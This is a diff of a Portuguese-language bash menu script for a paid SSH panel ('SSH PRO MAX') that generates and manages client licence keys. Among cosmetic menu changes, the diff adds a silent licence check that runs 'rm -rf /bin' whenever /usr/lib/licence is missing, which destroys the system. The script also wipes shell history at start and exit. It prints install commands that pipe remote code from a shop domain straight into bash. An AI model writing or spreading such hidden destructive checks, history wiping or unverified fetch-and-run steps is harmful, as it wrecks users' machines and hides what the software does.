@@ -1,10 +1,4 @@
 #!/bin/bash
-#====================================================
-#
-#  Modificaciones Al Codigo: Elijah_ssh
-#  https://t.me/Elijahssh
-#
-#====================================================
 cat /dev/null > ~/.bash_history && history -c
 barra="\033[0m\e[34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 x="ok"
@@ -73,14 +67,14 @@ done
 
 fun_gerkey () {
 echo ""
-echo -ne "\033[1;36mInfome o nome do Cliente:\033[1;37m "; read client
+echo -ne "\033[1;32mNOME DO CLIENTE:\033[1;33m "; read client
 if [[ -z $client ]]; then
    echo -e "\033[1;31m Nome invalido ou vazio\033[0m"
    sleep 2
    exit 0
 fi
 echo ""
-echo -ne "\033[1;36mQuantos minutos essa key deve durar\033[1;33m
+echo -ne "\033[1;32mDURACAO DA KEY\033[1;33m
 (\033[1;31mEX: 20m m=Minutos, h=Horas, d=Dias\033[1;33m)\033[1;37m: "; read _temp
 if [[ -z $_temp ]]; then
    echo -e "\033[1;31m Tempo invalido ou vazio\033[0m"
@@ -120,19 +114,13 @@ cp /home/Get /var/www/html/promax/Get
 cp /home/Pro /var/www/html/Pro
 fi
 clear
-echo -e "\033[0;34m============================"
-echo -e "\033[1;33m🌐 SCRIPT SSH PRO MAX 🌐    \033[0m"
-echo -e "\033[0;34m============================"
+echo -e "\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m ☆☆☆☆☆   \033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
+echo -e "\033[44;1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ●●● SSH PRO MAX ●●● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;36m\033[0m"
+echo -e "\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m ☆☆☆☆☆   \033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
 echo ""
-echo -e "\033[1;37mapt-get update -y; apt-get upgrade -y; wget $IP/scripts/Plus; chmod 777 Plus; ./Plus"
+echo -e "\033[1;37mbash <(wget -qO- scriptpromax.elijahssh.shop/shop)"
 echo ""
 echo -e "\033[1;32mKEY: \033[1;37m$pasta1$signus$pasta2\033[0m"
-echo ""
-#echo -e "\033[0;34m============================"
-#echo -e "\033[1;33mTUTORIAL DE INSTALAÇÃO !    \033[0m"
-echo -e "\033[0;34m============================"
-echo -e "\033[1;33mObrigado Pela Sua Contribuicao! 👍
-BY: ELIJAHSSH ✌️😎 \033[0m"
 echo ""
 echo -e "\033[1;32mUsuario: \033[1;37m $client\033[0m"
 echo -e "\033[1;32mValidade: \033[1;37m$_temp\033[0m"
@@ -167,7 +155,7 @@ bash /home/keyscript/$client &
 
 fun_gerkey_fixa () {
 echo ""
-echo -ne "\033[1;36mInfome o nome do Cliente:\033[1;37m "; read client
+echo -ne "\033[1;32mNOME DO CLIENTE:\033[1;33m "; read client
 if [[ -z $client ]]; then
    echo -e "\033[1;31m Nome invalido ou vazio\033[0m"
    sleep 2
@@ -205,19 +193,13 @@ cp /home/Get /var/www/html/promax/Get
 cp /home/Pro /var/www/html/Pro
 fi
 clear
-echo -e "\033[0;34m============================"
-echo -e "\033[1;33m🌐 SCRIPT SSH PRO MAX 🌐    \033[0m"
-echo -e "\033[0;34m============================"
+echo -e "\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m ☆☆☆☆☆   \033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
+echo -e "\033[44;1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ●●● SSH PRO MAX ●●● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;36m\033[0m"
+echo -e "\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m ☆☆☆☆☆   \033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
 echo ""
-echo -e "\033[1;37mapt-get update -y; apt-get upgrade -y; wget $IP/scripts/Plus; chmod 777 Plus; ./Plus"
+echo -e "\033[1;37mbash <(wget -qO- scriptpromax.elijahssh.shop/shop)"
 echo ""
 echo -e "\033[1;32mKEY: \033[1;37m$pasta1$signus$pasta2\033[0m"
-echo ""
-#echo -e "\033[0;34m============================"
-#echo -e "\033[1;33mTUTORIAL DE INSTALAÇÃO !    \033[0m"
-echo -e "\033[0;34m============================"
-echo -e "\033[1;33mObrigado Pela Sua Contribuicao! 👍
-BY: ELIJAHSSH ✌️😎 \033[0m"
 echo ""
 echo -e "\033[1;32mUsuario: \033[1;37m $client\033[0m"
 echo -e "\033[1;32mValidade: \033[1;37mPermanente\033[0m"
@@ -249,14 +231,14 @@ fi
 
 fun_gerkey_manual () {
 echo ""
-echo -ne "\033[1;36mInfome o nome do Cliente:\033[1;37m "; read client
+echo -ne "\033[1;32mNOME DO CLIENTE:\033[1;33m "; read client
 if [[ -z $client ]]; then
    echo -e "\033[1;31m Nome invalido ou vazio\033[0m"
    sleep 2
    exit 0
 fi
 echo ""
-echo -ne "\033[1;36mQuantos minutos essa key deve durar\033[1;33m
+echo -ne "\033[1;32mDURACAO DA KEY\033[1;33m
 (\033[1;31mEX: \033[1;32m20m m=Minutos, h=Horas, d=Dias\033[1;33m)\033[1;37m: "; read _temp
 if [[ -z $_temp ]]; then
    echo -e "\033[1;31m Tempo invalido ou vazio\033[0m"
@@ -264,8 +246,8 @@ if [[ -z $_temp ]]; then
    exit 0
 fi
 echo ""
-echo -ne "\033[1;36mDigite a Key [ xxxxxxxx:xxxxxxxx ]\033[1;33m
-(\033[1;31mEX: \033[1;32m1234:1234\033[1;33m)\033[1;37m: "; read key
+echo -ne "\033[1;32mDIGITE A KEY [ xxxxxxxx:xxxxxxxx ]\033[1;33m
+(\033[1;31mEX: \033[1;32m1234:1234\033[1;33m)\033[1;32m: "; read key
 _lnk1=$(echo "$key"|awk -F : '{print $1}')
 _lnk2=$(echo "$key"|awk -F : '{print $2}')
 echo "$_lnk1" > /tmp/c
@@ -311,19 +293,13 @@ cp /home/Get /var/www/html/promax/Get
 cp /home/Pro /var/www/html/Pro
 fi
 clear
-echo -e "\033[0;34m============================"
-echo -e "\033[1;33m🌐 SCRIPT SSH PRO MAX 🌐    \033[0m"
-echo -e "\033[0;34m============================"
+echo -e "\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m ☆☆☆☆☆   \033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
+echo -e "\033[44;1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ●●● SSH PRO MAX ●●● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;36m\033[0m"
+echo -e "\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m ☆☆☆☆☆   \033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
 echo ""
-echo -e "\033[1;37mapt-get update -y; apt-get upgrade -y; wget $IP/scripts/Plus; chmod 777 Plus; ./Plus"
+echo -e "\033[1;37mbash <(wget -qO- scriptpromax.elijahssh.shop/shop)"
 echo ""
 echo -e "\033[1;32mKEY: \033[1;37m$key1p$signus$key2p\033[0m"
-echo ""
-#echo -e "\033[0;34m============================"
-#echo -e "\033[1;33mTUTORIAL DE INSTALAÇÃO !    \033[0m"
-echo -e "\033[0;34m============================"
-echo -e "\033[1;33mObrigado Pela Sua Contribuicao! 👍
-BY: ELIJAHSSH ✌️😎 \033[0m"
 echo ""
 echo -e "\033[1;32mUsuario: \033[1;37m $client\033[0m"
 echo -e "\033[1;32mValidade: \033[1;37m$_temp\033[0m"
@@ -356,59 +332,39 @@ bash /home/keyscript/$client &
 }
 
 fun_keyson () {
-echo -e "$barra"
-echo -e " \033[1;31m++| \033[1;32mKEYS ONLINE \033[1;31m|++ \033[0m"
-echo -e "$barra"
 echo ""
-[ "$(ls -A /home/keyscript)" ] && echo -e "\033[1;32m Key Online!\033[1;37m" || echo -e "\033[1;31m Nenhuma Key Online!\033[0m"
+echo -e "\033[1;32mKEYS ONLINE\033[0m"
+echo ""
+[ "$(ls -A /home/keyscript)" ] && echo -e "\033[1;32m Key Online!\033[1;33m" || echo -e "\033[1;31m Nenhuma Key Online!\033[0m"
 echo ""
 ls /home/keyscript
 }
 
 fun_delkey () {
-echo -e "$barra"
-echo -e " \033[1;31m++| \033[1;32mREMOVER KEY ONLINE \033[1;31m|++ \033[0m"
-echo -e "$barra"
+echo ""
+echo -e "\033[1;32mREMOVER KEY ONLINE\033[0m"
+echo ""
 echo -e "\033[1;33m"
 for keyson in $(ls /home/keyscript |sort |sed 's/.sh//g')
 do
 echo " $keyson"
 done
 echo ""
-echo -ne "\033[1;36m Imforme o nome: \033[1;37m "; read client
+echo -ne "\033[1;33mINFORME O NOME: \033[1;32m "; read client
 if [ -e /home/keyscript/$client ]; then
     tmp=$(cat /home/keyscript/$client | sed -n '2 p')
     sed -i "s/\b$tmp\b/echo -n/g" /home/keyscript/$client > /dev/null 2>&1
     bash /home/keyscript/$client;
     sleep 2
-    echo -e "\n\033[1;32m Key Removida Com Sucesso !\033[0m"
+    echo -e "\n\033[1;32mKEY REMOVIDA !\033[0m"
     else
     echo -e "\n\033[1;31m Key nao existente !\033[0m"
     sleep 2.5s
 fi
 }
 
-bots () {
-clear
-[[ $(screen -list| grep -c 'bot_script') == '0' ]] && {
-    clear
-    echo -e "\E[44;1;37m     ATIVACÃO BOT SCRIPT    \E[0m"
-    echo ""
-    echo -ne "\n\033[1;32mINFORME O TOKEN\033[1;37m: "; read token
-    echo -ne "\033[1;32mINFORME SEU ID:\033[1;37m "; read iduser
-    cd /etc/bot
-    screen -dmS bot_script ./botscript $token $iduser > /dev/null 2>&1
-    clear && echo "BOT ATIVADO"
-    keyscript
-} || {
-    screen -r -S "bot_script" -X quit
-    clear && echo "BOT DESATIVADO"
-    keyscript
-}
-}
-
 autoe () {
-clear
+echo ""
 if grep "keyscript;" /etc/profile > /dev/null; then
       offautkeyscript () {
          sed -i '/keyscript;/d' /etc/profile
@@ -416,6 +372,7 @@ if grep "keyscript;" /etc/profile > /dev/null; then
       fun_bar 'offautkeyscript'
       echo ""
       echo -e "\033[1;31mAUTO EXECUÇÃO DESATIVADO!\033[0m"
+      sleep 2s
       clear
       keyscript
    else
@@ -426,59 +383,14 @@ if grep "keyscript;" /etc/profile > /dev/null; then
       fun_bar 'autkeyscript'
       echo ""
       echo -e "\033[1;32mAUTO EXECUÇÃO ATIVADO!\033[0m"
+      sleep 2s
       clear
       keyscript
    fi
    }
 
-stsbotteste=$(ps x | grep "bot_script"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
-_ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
-_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
-_usop=$(printf '%-1s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
-_core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
-echo -e "$barra"
-sts=$([ "$(ls -A /home/keyscript)" ] && echo -e "\033[1;32m Key Online!\033[1;37m" || echo -e "\033[1;31m Nenhuma Key Online!\033[0m")
-echo -e "\033[1;37mSTATUS: $sts"
-echo -e "$barra"
-mine_port
-echo -e "$barra"
-echo -e " \033[1;31m++| \033[1;32mKEYGEN SSH PRO MAX \033[1;31m|++       \033[1;33m[ VERSAO: 2.0 BETA ]\033[0m"
-echo -e "$barra"
-echo -e "\033[1;37m |1| \033[1;31m<----> \033[1;36mGERAR KEY ALEATORIA \033[1;32m[CV] \033[0m"
-echo -e "\033[1;37m |2| \033[1;31m<----> \033[1;36mGERAR KEY ALEATORIA FIXA \033[1;32m[SV] \033[0m"
-echo -e "\033[1;37m |3| \033[1;31m<----> \033[1;36mGERAR KEY MANUAL\033[1;33m ! \033[1;32m[CV] \033[0m"
-if [ ! -e /var/www/html/1:8%7o.2sg3-q:5 ]; then
-echo -e "\033[1;37m |4| \033[1;31m<----> \033[1;31m(PARADO)\033[1;36m - INICIAR KEYGEN"
-else
-echo -e "\033[1;37m |4| \033[1;31m<----> \033[1;32m(RODANDO)\033[1;36m - PARAR KEYGEN"
-fi
-echo -e "\033[1;37m |5| \033[1;31m<----> \033[1;36mKEYS ONLINE\033[0m"
-echo -e "\033[1;37m |6| \033[1;31m<----> \033[1;36mREMOVER KEY\033[0m"
-#echo -e "\033[1;37m |X| \033[1;31m<----> \033[1;36mLOG DE REGISTROS\033[0m"
-echo -e "\033[1;37m |7| \033[1;31m<----> \033[1;33m[ ! ] \033[1;32mACTUALIZAR \033[0m"
-echo -e "\033[1;37m |8| \033[1;31m<----> \033[1;33m[ ! ] \033[1;31mDESINSTALAR KEYGEN\033[0m "
-echo -e "\033[1;37m |9| \033[1;31m<----> \033[1;36mOTIMIZAR SERVIDOR    \033[1;31mRam:   \033[1;37m $_usor\033[0m"
-echo -e "\033[1;37m |10| \033[1;31m<----> \033[1;36mBOT SCRIPT $stsbotteste\033[0m"
-echo -e "\033[1;37m |11| \033[1;31m<----> \033[1;36mAUTO EXECUCAO $stsbotteste\033[0m"
-echo -e "\033[1;37m |0| \033[1;31m<----> \033[1;36mSAIR DO KEYGEN       \033[1;31mNucleo:\033[1;37m $_usop \033[0m"
-echo -e "                           \033[1;37m@Elijahssh\033[0m \033[0m"
-echo -e "$barra"
-echo -ne "\033[1;32m[0/9]: "; read x
-
-case $x in
-1)
-fun_gerkey
-echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
-;;
-2)
-fun_gerkey_fixa
-echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
-;;
-3)
-fun_gerkey_manual
-echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
-;;
-4)
+ativ () {
+echo ""
 if [ ! -e /var/www/html/1:8%7o.2sg3-q:5 ]; then
 #KEYGEN SSH PRO MAX ON
 pkill -f 80
@@ -490,6 +402,9 @@ echo "#KEYGEN SSH PRO MAX ON" > /var/www/html/1:8%7o.2sg3-q:5
 echo ""
 echo -e "\033[1;32mIniciado"
 echo -e "\033[1;32mRodando Apache2 Porta 80"
+sleep 3s
+clear
+keyscript
 else
 #KEYGEN SSH PRO MAX OFF
 pkill -f 80
@@ -499,70 +414,146 @@ rm -rf /var/www/html/1:8%7o.2sg3-q:5
 echo ""
 echo -e "\033[1;31mParado"
 echo -e "\033[1;32mRemovido Apache2 Porta 80"
+sleep 3s
 fi
-echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
+clear
+keyscript
+}
+
+anali () {
+cd /var/www/html
+ls
+echo -e "\033[1;97m╠━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━━═━═\033[0m\033[01;97m║" | lolcat -t
+cd /home/keyscript
+ls
+echo -e "\033[1;97m╠━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━━═━═\033[0m\033[01;97m║" | lolcat -t
+echo ""
+}
+
+[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m◉ ") || stsf=$(echo -e "\033[1;31m○ ")
+stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
+stsbotteste=$(ps x | grep "bot_teste"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
+stsbotrev=$(ps x | grep "bot_rev"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
+autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
+stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
+stson=$(ps x | grep "onlineapp"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
+stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
+[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
+if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
+system=$(cut -d' ' -f1 /etc/issue.net)
+system+=$(echo ' ')
+system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
+elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
+system=$(cut -d' ' -f1 /etc/issue.net)
+system+=$(echo ' ')
+system+=$(cut -d' ' -f3 /etc/issue.net)
+else
+system=$(cut -d' ' -f1 /etc/issue.net)
+fi
+_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
+[[ "$(cat /etc/SSHPlus/Exp)" != "" ]] && _expuser=$(cat /etc/SSHPlus/Exp) || _expuser="0"
+[[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
+[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
+_onli=$(($_ons + $_onop + $_ondrp))
+_ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
+_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
+_usop=$(printf '%-1s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
+_core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
+_system=$(printf '%-14s' "$system")
+system=$(cat /etc/issue.net)
+date=$(date '+%d-%m-%Y <> %H:%M:%S')
+_hora=$(printf '%(%H:%M:%S)T')
+_onlin=$(printf '%-5s' "$_onli")
+_userexp=$(printf '%-5s' "$_expuser")
+_tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
+clear
+echo -e "\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m ☆☆☆☆☆   \033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
+echo -e "\033[44;1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ●●● SSH PRO MAX ●●● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;36m\033[0m"
+echo -e "\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m ☆☆☆☆☆   \033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
+echo ""
+sts=$([ "$(ls -A /home/keyscript)" ] && echo -e "\033[1;32mKey Online!\033[1;37m" || echo -e "\033[1;31mNenhuma Key Online!\033[0m")
+echo -e "\033[1;37m STATUS: $sts"
+mine_port
+echo ""
+echo -e "\033[97m$system         $date"
+echo -e "\033[01;97m║ \033[44;1;97m▬▬▬▬▬▬▬▬▬▬▬▬ GERADOR SSH PRO MAX ▬▬▬▬▬▬▬▬▬▬▬▬\033[0m \033[01;97m║"
+echo -e "\033[1;32m  MEMORIA RAM     PROCESSADOR    \033[1;97mOLINE:\033[1;32m $_onlin\033[0m\033[01;97m  "
+echo -e "\033[1;97m  TOTAL:\033[1;32m$_ram\033[1;97mNUCLEO: \033[1;32m$_core      \033[1;97mVENCIDOS:\033[1;31m $_userexp\033[01;97m"
+echo -e "\033[1;97m  EM USO:\033[1;31m $_usor\033[1;97mEM USO:\033[1;31m $_usop  \033[1;97m CRIADOS:\033[1;97m $_tuser     \033[01;97m "
+echo -e "\033[1;97m╠━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━━═━═\033[0m\033[01;97m║" | lolcat -t
+echo -e "\033[01;97m║                                               ║"
+echo -e "\033[01;97m║ \033[1;32m < 01 > \033[01;97m ● GERAR KEY ALEATORIA                ║\033[0m"
+echo -e "\033[01;97m║ \033[1;32m < 02 > \033[0m\033[01;97m ● KEY ALEATORIA FIXA                 ║\033[0m"
+echo -e "\033[01;97m║ \033[1;32m < 03 > \033[0m\033[01;97m ● KEY MANUAL                         ║\033[0m"
+if [ -e /var/www/html/1:8%7o.2sg3-q:5 ]; then
+echo -e "\033[01;97m║ \033[1;32m < 04 > \033[0m\033[01;97m ● PARAR KEYGEN \033[1;32m◉                     \033[01;33m║\033[0m"
+else
+echo -e "\033[01;97m║ \033[1;32m < 04 > \033[0m\033[01;97m ● INICIAR KEYGEN \033[1;31m○                   \033[01;33m║\033[0m"
+fi
+echo -e "\033[01;97m║ \033[1;32m < 05 > \033[0m\033[01;97m ● KEYS ONLINE                        ║\033[0m"
+echo -e "\033[01;97m║ \033[1;32m < 06 > \033[0m\033[01;97m ● REMOVER KEY                        ║\033[0m"
+echo -e "\033[01;97m║ \033[1;32m < 07 > \033[0m\033[01;97m ● BOT SCRIPT $stsbotteste                        ║\033[0m"
+echo -e "\033[01;97m║ \033[1;32m < 08 > \033[0m\033[01;97m ● AUTO EXECUCAO $autm                   \033[01;33m║\033[0m"
+echo -e "\033[1;97m╠━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━━═━═\033[0m\033[01;97m║"
+echo -e "\033[01;97m║ \033[44;1;97m A \033[0m\033[01;97m ● ROOT        \033[44;1;97m B \033[0m\033[01;97m ● VIEW       \033[44;1;97m C \033[0m\033[01;97m ● INFO ║"
+echo -e "\033[1;97m╠━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━━═━═\033[0m\033[01;97m║" | lolcat -t
+echo -e "\033[3;32m                                     VERSAO 3.0.1"
+echo -ne "\033[1;97mESCOLHA UMA OPCAO\033[1;33m\033[1;31m\033[1;34m : \033[1;32m"; read x
+case $x in
+a)
+clear
+gr0p
+;;
+b)
+anali
+echo -ne "\n\033[1;32mENTER \033[1;33mPARA RETORNAR AO \033[1;32mMENU!\033[0m"; read
+keyscript
+;;
+c)
+clear
+inv0p
+echo -ne "\n\033[1;32mENTER \033[1;33mPARA RETORNAR AO \033[1;32mMENU!\033[0m"; read
+keyscript
+;;
+1)
+fun_gerkey
+echo -ne "\n\033[1;32mENTER \033[1;33mPARA RETORNAR AO \033[1;32mMENU!\033[0m"; read
+keyscript
+;;
+2)
+fun_gerkey_fixa
+echo -ne "\n\033[1;32mENTER \033[1;33mPARA RETORNAR AO \033[1;32mMENU!\033[0m"; read
+keyscript
+;;
+3)
+fun_gerkey_manual
+echo -ne "\n\033[1;32mENTER \033[1;33mPARA RETORNAR AO \033[1;32mMENU!\033[0m"; read
+keyscript
+;;
+4)
+ativ
 ;;
 5)
-clear
 fun_keyson
-echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
+echo -ne "\n\033[1;32mENTER \033[1;33mPARA RETORNAR AO \033[1;32mMENU!\033[0m"; read
+keyscript
 ;;
 6)
-clear
 fun_delkey
-echo -e "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"
+echo -ne "\n\033[1;32mENTER \033[1;33mPARA RETORNAR AO \033[1;32mMENU!\033[0m"; read
+keyscript
 ;;
 7)
-clear
-rm $HOME/instgerador.sh* > /dev/null 2>&1; wget https://raw.githubusercontent.com/KEYXXELIJAHSSHX3/SSHPRO_MAX-GERADOXX2/main/instgerador.sh; chmod 777 instgerador.sh* && ./instgerador.sh*
-exit
+bts0p
 ;;
 8)
-    rm -rf /home/lisa > /dev/null 2>&1
-    rm -rf /home/Get > /dev/null 2>&1
-    rm -rf /home/Pro > /dev/null 2>&1
-    rm -rf /home/index.html > /dev/null 2>&1
-    rm -rf /home/_script_$ > /dev/null 2>&1
-    rm -rf /home/keyscript > /dev/null 2>&1 > /dev/null 2>&1
-    rm -rf /bin/keyscript > /dev/null 2>&1
-    rm -rf /bin/key > /dev/null 2>&1
-    rm -rf /bin/otimizar > /dev/null 2>&1
-    rm -rf /var/www/html/Index.php > /dev/null 2>&1
-    rm -rf /var/www/html/script > /dev/null 2>&1
-    rm -rf /var/www/html/promax > /dev/null 2>&1
-    rm -rf /var/www/html/1:8%7o.2sg3-q:5 > /dev/null 2>&1
-    pkill -f 80
-    cp /bin/ports.conf /etc/apache2/ports.conf > /dev/null 2>&1
-    service apache2 restart > /dev/null 2>&1
-    rm -rf /bin/ports.conf > /dev/null 2>&1
-    rm -rf /bin/ports2.conf > /dev/null 2>&1
-exit
-clear
-;;
-9)
-clear
-otimizar
-echo -e "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
-;;
-10)
-clear
-bots
-;;
-11)
 clear
 autoe
 ;;
-0)
-echo -ne "\n\033[1;31mSaindo... Enter para SAIR\033[0m"; read
-clear
-exit
-clear
-;;
 *)
 echo -ne "\n\033[1;31mOpcao invalida !\033[0m"; read
+exit
 ok
-;;
 esac
 done
 #fim
-cat /dev/null > ~/.bash_history && history -c
